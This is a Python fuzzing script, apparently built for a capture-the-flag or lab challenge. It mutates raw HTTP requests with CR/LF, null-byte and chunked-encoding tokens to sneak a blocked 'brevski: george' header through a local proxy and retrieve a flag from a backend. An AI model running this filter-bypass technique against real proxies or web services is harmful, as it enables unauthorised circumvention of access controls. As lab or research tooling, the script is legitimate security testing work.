#!/usr/bin/env python3
"""
mutfuzz - blind byte-mutation fuzz of a `brevski: george` request through
proxoxy into the ENVIRON-DUMPING backend (mccrab3env, proxy on 58888).

The ledger closes the header channel by proof.  This is the instrument that a
proof can't be: it doesn't care WHY a shape works.  Win condition is the env
dumper reporting  "brevski_via_headers_get": "george"  on a request that came
through the proxy.

Controls
  * a plain `brevski: zzz` request must return 200 with brevski null  (proxy alive)
  * a plain `brevski: george` request must return zero bytes          (rule alive)
Both are re-checked every 2000 probes; the run aborts if either breaks.
"""
import random, socket, sys, time

TARGET = ("127.0.0.1", 58888)
WIN = b'"brevski_via_headers_get": "george"'

BASE = (b"POST /flag HTTP/1.1\r\n"
        b"Host: h\r\n"
        b"brevski: george\r\n"
        b"Content-Length: 0\r\n"
        b"\r\n")


def probe(payload, wait=0.25):
    try:
        s = socket.create_connection(TARGET, timeout=2)
    except Exception:
        return None
    try:
        s.sendall(payload)
        s.settimeout(wait)
        out = b""
        try:
            while len(out) < 4096:
                d = s.recv(4096)
                if not d:
                    break
                out += d
        except socket.timeout:
            pass
        return out
    except Exception:
        return b""
    finally:
        try:
            s.close()
        except Exception:
            pass


def controls():
    a = probe(BASE.replace(b"george", b"zzz"))
    b = probe(BASE)
    ok_a = a is not None and b'"brevski_via_headers_get": "zzz"' in a
    ok_b = (b == b"")
    return ok_a, ok_b, a, b


INTERESTING = [b"\r", b"\n", b"\r\n", b"\t", b" ", b":", b";", b",", b"\x00",
               b"\x0b", b"\x0c", b"\x7f", b"\x80", b"\xa0", b"\x85", b"\xff",
               b"\xdf", b"_", b"-", b".", b"0", b"chunked", b"Transfer-Encoding",
               b"Content-Length", b"brevski", b"george", b"Host: h", b"HTTP/1.1",
               b"\r\n\r\n", b"0\r\n", b"%0d%0a", b"\\r\\n"]


def mutate(rng, base):
    b = bytearray(base)
    for _ in range(rng.randint(1, 3)):
        op = rng.randrange(4)
        if not b:
            break
        i = rng.randrange(len(b) + 1)
        if op == 0:                                   # insert interesting token
            b[i:i] = rng.choice(INTERESTING)
        elif op == 1:                                 # insert random byte
            b[i:i] = bytes([rng.randrange(256)])
        elif op == 2 and i < len(b):                  # replace byte
            b[i] = rng.randrange(256)
        elif i < len(b):                              # delete a run
            n = rng.randint(1, 4)
            del b[i:i + n]
    return bytes(b)


def main():
    n = int(sys.argv[1]) if len(sys.argv) > 1 else 20000
    seed = int(sys.argv[2]) if len(sys.argv) > 2 else 1
    rng = random.Random(seed)
    ok_a, ok_b, a, b = controls()
    print("CONTROL proxy-alive(zzz->200,zzz)=%s  rule-alive(george->0 bytes)=%s" % (ok_a, ok_b))
    if not (ok_a and ok_b):
        print("control failed:\n zzz -> %r\n george -> %r" % (a[:300] if a else a, b[:300] if b else b))
        return
    t0 = time.time()
    served = 0
    wins = []
    for i in range(n):
        p = mutate(rng, BASE)
        if b"george" not in p:
            continue
        r = probe(p, wait=0.12)
        if r:
            served += 1
            if WIN in r:
                wins.append(p)
                print("\n*** WIN ***\n%r\n" % p)
                sys.stdout.flush()
        if (i + 1) % 2000 == 0:
            ok_a, ok_b, _, _ = controls()
            print("%6d probes  served=%d  wins=%d  %.0f/s  controls=%s,%s"
                  % (i + 1, served, len(wins), (i + 1) / (time.time() - t0), ok_a, ok_b))
            sys.stdout.flush()
            if not (ok_a and ok_b):
                print("CONTROL BROKE - aborting")
                return
    print("done: %d probes, %d served, %d wins, %.0f/s"
          % (n, served, len(wins), n / (time.time() - t0)))
    for w in wins:
        print(repr(w))


main()
